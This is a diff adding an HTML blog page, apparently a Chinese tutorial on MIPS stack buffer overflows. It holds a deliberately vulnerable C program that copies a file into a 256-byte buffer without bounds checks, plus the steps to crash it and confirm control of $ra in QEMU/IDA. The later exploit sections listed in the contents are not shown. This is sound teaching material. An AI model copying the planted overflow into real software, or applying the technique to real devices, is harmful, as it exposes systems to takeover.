@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>mips架构堆栈缓冲区溢出调试与利用 | Tig3rHu&#39;s Blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="mips架构堆栈缓冲区溢出调试与利用 | Tig3rHu&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Tig3rHu&#39;s Blog">
+<meta property="og:url" content="https://tig3rhu.github.io/45__%E8%93%9D%E7%89%99_sniff_CTF.assets/2023-08-06.html">
+<meta property="og:site_name" content="Tig3rHu&#39;s Blog">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-18T09:30:05.460Z">
+<meta property="article:modified_time" content="2023-08-06T14:24:36.000Z">
+<meta property="article:author" content="Tig3rHu">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Tig3rHu</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="rss"
+               href="/atom.xml"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-rss"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="github"
+               href="https://github.com/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="facebook"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-facebook"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="instagram"
+               href="https://www.facebook.com/faker.tops"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-instagram"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/yelog/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="weibo"
+               href="http://weibo.com/u/2307534817"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-weibo"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="jianshu"
+               href="https://www.jianshu.com/u/ff56736de7cf"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-jianshu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="zhihu"
+               href="https://www.zhihu.com/people/jaytp/activities"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-zhihu"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="oschina"
+               href="https://my.oschina.net/yelog"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-oschina"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+            <a title="email"
+               href="mailto:jaytp@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=872336115&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="kugou"
+               href="https://www.kugou.com/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-kugou"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=88151013"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(19)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="19">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="apk逆向__婚礼纪逆向">apk逆向__婚礼纪逆向</span>
+            <span class="post-date" title="2024-01-03 23:51:59">2024/01/03</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Android各种机型刷机踩坑记录">Android各种机型刷机踩坑记录</span>
+            <span class="post-date" title="2024-01-02 23:08:52">2024/01/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="apk逆向__懒人驾考去会员">apk逆向__懒人驾考去会员</span>
+            <span class="post-date" title="2024-01-02 22:42:38">2024/01/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="apk逆向__滴答清单去会员">apk逆向__滴答清单去会员</span>
+            <span class="post-date" title="2024-01-02 22:34:09">2024/01/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&%20CTF/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="蓝牙sniff&amp;CTF&amp;develop">蓝牙sniff&amp;CTF&amp;develop</span>
+            <span class="post-date" title="2023-12-18 17:30:59">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/22_%E4%BD%BF%E7%94%A8LD_PROLOAD_%E8%BF%9B%E8%A1%8Chook/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Linux 使用LD_PRELOAD 进行hook">Linux 使用LD_PRELOAD 进行hook</span>
+            <span class="post-date" title="2023-12-18 17:19:56">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="QiLing 框架学习WriteUp">QiLing 框架学习WriteUp</span>
+            <span class="post-date" title="2023-12-18 17:12:42">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/18/mips%E6%9E%B6%E6%9E%84___%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="mips架构堆栈缓冲区溢出调试与利用">mips架构堆栈缓冲区溢出调试与利用</span>
+            <span class="post-date" title="2023-12-18 16:47:08">2023/12/18</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/17/NetGear%20R7000P%20%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NetGear R7000P 路由器栈溢出漏洞硬件调试与分析">NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</span>
+            <span class="post-date" title="2023-12-17 16:06:42">2023/12/17</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NetGear_夜鹰_RAX40V2_设备与固件分析">NetGear_夜鹰_RAX40V2_设备与固件分析</span>
+            <span class="post-date" title="2023-12-16 20:57:42">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CVE-2021-20090 身份验证绕过漏洞分析">CVE-2021-20090 身份验证绕过漏洞分析</span>
+            <span class="post-date" title="2023-12-16 20:46:07">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NetGear__DNG2200v1系列漏洞分析">NetGear__DNG2200v1系列漏洞分析</span>
+            <span class="post-date" title="2023-12-16 20:34:25">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Linksys EA6100 固件解密过程">Linksys EA6100 固件解密过程</span>
+            <span class="post-date" title="2023-12-16 20:20:43">2023/12/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用">Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用</span>
+            <span class="post-date" title="2023-12-15 23:01:41">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="TP-Link WR841n 路由器多个缓冲区溢出漏洞复现">TP-Link WR841n 路由器多个缓冲区溢出漏洞复现</span>
+            <span class="post-date" title="2023-12-15 22:52:18">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="USG310_4.70_固件解密分析">USG310_4.70_固件解密分析</span>
+            <span class="post-date" title="2023-12-15 22:47:02">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/55__%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="github 博客搭建记录">github 博客搭建记录</span>
+            <span class="post-date" title="2023-12-15 17:58:11">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Cisco Rv160 远程命令执行漏洞分析">Cisco Rv160 远程命令执行漏洞分析</span>
+            <span class="post-date" title="2023-12-15 17:01:20">2023/12/15</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2023/12/15/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2023-12-15 15:15:35">2023/12/15</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-mips架构___堆栈缓冲区溢出调试与利用" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">mips架构堆栈缓冲区溢出调试与利用</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-12-18 16:58:09'>2023-12-18 16:47</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-text">mips架构堆栈缓冲区溢出调试与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MIPS-%E5%A0%86%E6%A0%88%E5%8E%9F%E7%90%86"><span class="toc-text">MIPS 堆栈原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">非叶子函数调用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">叶子函数调用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="toc-text">函数调用参数传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E7%A9%BA%E9%97%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-text">栈空间缓冲区溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-text">文件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Eexploit%E5%88%A9%E7%94%A8%E5%BC%80%E5%8F%91"><span class="toc-text">漏洞exploit利用开发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E9%80%94%E5%BE%84"><span class="toc-text">寻找可利用的攻击途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0ROP-chain"><span class="toc-text">构造ROP chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">编写漏洞利用程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cexploit"><span class="toc-text">执行exploit</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="mips架构堆栈缓冲区溢出调试与利用"><a href="#mips架构堆栈缓冲区溢出调试与利用" class="headerlink" title="mips架构堆栈缓冲区溢出调试与利用"></a>mips架构堆栈缓冲区溢出调试与利用</h1><h2 id="MIPS-堆栈原理"><a href="#MIPS-堆栈原理" class="headerlink" title="MIPS 堆栈原理"></a>MIPS 堆栈原理</h2><p>栈是一种具有先进后出队列性质的数据结构。调用栈（Call Stack）是指存放某个程序正在运行的函数的信息的栈。调用栈由栈帧(Stack Frame)组成，每个栈帧对应一个未完成运行的函数。<br>这里主要介绍 物联网设备中常见的指令架构MIPS32 ，这个架构中的函数有两种，叶子函数和非叶子函数，判断叶子函数的方式只需要判断函数内是否调用其他函数，有调用则是非叶子函数，没有调用则是叶子函数，</p>
+<h3 id="非叶子函数调用过程"><a href="#非叶子函数调用过程" class="headerlink" title="非叶子函数调用过程"></a>非叶子函数调用过程</h3><p>程序在跳转到非叶子函数以后，则非叶子函数会把调用它的函数的返回地址(也就是$RA寄存器)存入堆栈中，再将自己函数返回地址存入到$RA，在函数返回时，非叶子函数会将栈中先前保存的返回地址取出保存到$RA中，再执行 “jr $ra”返回原函数。</p>
+<h3 id="叶子函数调用过程"><a href="#叶子函数调用过程" class="headerlink" title="叶子函数调用过程"></a>叶子函数调用过程</h3><p>程序在跳转到叶子函数中，过程比较简单，叶子函数不会改变寄存器$RA的值，因为函数跳转到它，就不会再有跳转了，因此在函数返回时，直接 “jr $ra”返回原函数。</p>
+<h3 id="函数调用参数传递"><a href="#函数调用参数传递" class="headerlink" title="函数调用参数传递"></a>函数调用参数传递</h3><p>在MIPS 体系的函数调用过程中，通过$a0~ $a3 传递前四个参数，多余的通过栈传递。</p>
+<h3 id="栈空间缓冲区溢出"><a href="#栈空间缓冲区溢出" class="headerlink" title="栈空间缓冲区溢出"></a>栈空间缓冲区溢出</h3><p>栈空间缓冲区是用于内存中存储数据的内存区域。<br>缓冲区溢出就是大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检车不严格，导致小缓冲区明显不足以接收整个大缓冲区的数据，超出的部分覆盖了与小缓冲区相邻的内存区中的其他数据而引发的内存问题。<br>成功利用缓冲区溢出可能造成严重的后果，基本上可分为3 种情况，分别是拒绝服务、获得用户权限、获得系统权限。</p>
+<p>接下来和我一起来学习栈空间缓冲区溢出吧！ ：）</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>系统：Ubuntu 16.04<br>工具：IDA 7.5、QEMU<br>mips交叉编译环境</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">mips_stack.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> do_system(<span class="type">int</span> code,<span class="type">char</span> *cmd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> stat fileData;</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">&quot;/home/tigerortiger/study/mips_stack/passwd&quot;</span>,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">&quot;/home/tigerortiger/study/mips_stack/passwd&quot;</span>,<span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;Cannot open file passwd!n&quot;</span>);</span><br><span class="line">        exit(<span class="number">1</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    printf(<span class="string">&quot;[+]  1 line : &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    <span class="comment">//printf(&quot;[+]   %s \r\n&quot;,ch);</span></span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = <span class="string">&#x27;x00&#x27;</span>;</span><br><span class="line">    printf(<span class="string">&quot;[+] passwd content : %s&quot;</span>,buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!strcmp(buf,<span class="string">&quot;adminpwd&quot;</span>))</span><br><span class="line">    &#123;        </span><br><span class="line">        do_system(count,<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;you have an invalid password!n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mips-linux-gcc -static /home/tigerortiger/study/mips_stack/stack.c -o stack</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>1、首先查看文件信息，可以看到是mips32 架构</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image1.png" alt="image-20231217162032481"></p>
+<p>2、根据查看mips_stack.c 的源码或者运行文件可以知道，main()函数会读取passwd 文件，并且将文件的内容种存入局部变量buf 中，而buf 仅为256字节，如果passwd 中的文件大于256字节，那么多余的字节就会导致缓冲区无法放下，造成溢出现象。<br>3、生成600个字符串都passwd<br><code>python -c &quot;print &#39;A&#39;*600&quot;&gt;passwd</code><br>4、执行文件，可以看到”segmentation fault “</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image2.png" alt="image-20231217162032481"></p>
+<p>5、接下来进行远程调试，查看栈上的情况<br><code>tigerortiger@ubuntu ~/s/mips_stack&gt; qemu-mips-static -g 1234 ./stack</code></p>
+<p>6、使用IDA 进行调试，连接，运行。</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image3.png" alt="image-20231217162032481"></p>
+<p>7、程序在试图执行0x41414141处的指令时发生了崩溃,这刚好是AAAA的十六进制，0x41414141超出了进程,引发了断段故障</p>
+<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image4.png" alt="image-20231217162032481"></p>
+<p>由此上述分析可知，文件存在缓冲区溢出的漏洞，并且可以将数据覆盖到$RA寄存器中。</p>
